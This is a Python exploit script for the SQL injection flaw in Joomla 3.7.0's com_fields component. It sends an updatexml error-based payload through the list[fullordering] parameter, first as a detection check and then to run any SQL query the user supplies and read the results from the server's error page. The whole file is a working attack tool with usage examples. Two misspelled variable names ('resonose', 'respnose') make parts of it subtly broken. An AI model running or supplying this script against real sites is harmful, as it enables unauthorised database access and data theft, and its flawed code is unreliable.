#!/usr/bin/env python
# author:Xiaogang
# Help: joomla 3.7.0 SQL注入漏洞

import requests
import sys
import re

def test_hint():
    print('[INFO] Checking Joomla 3.7.0 sql注入 ...')

def test_sql(url):
    payload = '''/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x3a,concat(1,(select%20md5(666))),1)'''
    target = url+payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0'
    }
    try:
        test_hint()
        response = requests.request("GET",target,headers=header)
        if response.status_code == 500:
            if "XPATH syntax error" in response.text:
                pattern = "XPATH syntax error:(.*)</title>"
                data = re.search(pattern, resonose.text).group(0)
                data = data.lstrip("XPATH syntax error:&#039;").rstrip("&#039;</title>")
                print("存在sql注入漏洞\n返回值：md5(666) ==",data)
            else:
                print("漏洞不存在")
        else:
            print("无响应")
    except Exception as e:
        print("发生错误：{}".format(e))

def attack_sql(url,sql):
    payload = '''/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,0x7e,('''+sql+'''),0x7e),1)'''
    target = url+payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0'
    }
    try:
        test_hint()
        response = requests.request("GET",target,headers=header)
        if respnose.status_code == 500:
            if "XPATH syntax error" in response.text:
                pattern = "XPATH syntax error:(.*)</title>"
                data = re.search(pattern, response.text).group(0)
                data = data.lstrip("XPATH syntax error:&#039;").rstrip("&#039;</title>")
                print("执行成功")
                print("返回结果:",data)
            else:
                print("执行失败")
        else:
            print("无响应")
    except Exception as e:
        print("发生错误：{}".format(e))


def main():
    args = sys.argv
    if len(args) == 4:
        attack_sql(args[1], args[3])
    elif len(args) == 2:
        test_sql(args[1])
    else:
        print("Usage: python {} url地址".format(args[0]))
        print("Usage: python {} url地址 -sql sql语句".format(args[0]))
        print("Usage: python {} http://192.168.1.1:8080/ -sql select+database()".format(args[0]))

if __name__ == "__main__":
    main()